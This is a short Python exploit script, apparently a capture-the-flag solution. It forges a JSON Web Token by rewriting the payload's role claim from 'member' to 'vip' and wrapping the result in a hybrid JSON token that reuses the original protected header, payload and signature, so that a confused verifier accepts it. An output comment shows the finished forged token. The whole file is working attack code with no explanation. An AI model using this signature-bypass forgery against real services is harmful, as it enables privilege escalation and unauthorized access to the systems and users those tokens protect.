from json import loads, dumps
from jwcrypto.common import base64url_encode, base64url_decode


def topic(topic):
    [header, payload, signature] = topic.split('.')
    parsed_payload = loads(base64url_decode(payload))
    print(parsed_payload)
    parsed_payload["role"] = "vip"
    print(dumps(parsed_payload, separators=(',', ':')))
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    print(fake_payload)
    return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '

print(topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ1NzU1MjEsImlhdCI6MTcxNDU3MTkyMSwianRpIjoiQVk0NzVNb3RETHNsSENpbUxtR3JXQSIsIm5iZiI6MTcxNDU3MTkyMSwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.YVvAH0_4EeqHYJul89B8xEa8RxlNarw5xdmPldPPtshmcU6LLQjvC28Cj6J1XnEFls83jCi9XRXSY-50f4jHO7z9WHjDszJoQ6F6MXtmGzsAaLfoJBwKkeGMvs_0zMlE9vNBHVrNMOXPf30UZUMtWgyUiVZp33ugkfujWhGTECdd2lH6xQ9FfzhpG5t3nk6UNVY4Z7KenqZ_UybP1FqRhLdRu1dGsSHqXWtzInVsJcHKlwEw9BGtp3S0IG2wWUBEl0q19b1mNRVXKvnWrTWf9DPImOIhnGZVAMvG8p4QCx6KZdVhpbA1g4-pmjf4PsyvQwdxo1uh5uEx-Xej-gBYzQ'))
#{" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ1NzU1MjEsImlhdCI6MTcxNDU3MTkyMSwianRpIjoiQVk0NzVNb3RETHNsSENpbUxtR3JXQSIsIm5iZiI6MTcxNDU3MTkyMSwicm9sZSI6InZpcCIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTQ1NzU1MjEsImlhdCI6MTcxNDU3MTkyMSwianRpIjoiQVk0NzVNb3RETHNsSENpbUxtR3JXQSIsIm5iZiI6MTcxNDU3MTkyMSwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9","signature":"YVvAH0_4EeqHYJul89B8xEa8RxlNarw5xdmPldPPtshmcU6LLQjvC28Cj6J1XnEFls83jCi9XRXSY-50f4jHO7z9WHjDszJoQ6F6MXtmGzsAaLfoJBwKkeGMvs_0zMlE9vNBHVrNMOXPf30UZUMtWgyUiVZp33ugkfujWhGTECdd2lH6xQ9FfzhpG5t3nk6UNVY4Z7KenqZ_UybP1FqRhLdRu1dGsSHqXWtzInVsJcHKlwEw9BGtp3S0IG2wWUBEl0q19b1mNRVXKvnWrTWf9DPImOIhnGZVAMvG8p4QCx6KZdVhpbA1g4-pmjf4PsyvQwdxo1uh5uEx-Xej-gBYzQ"}
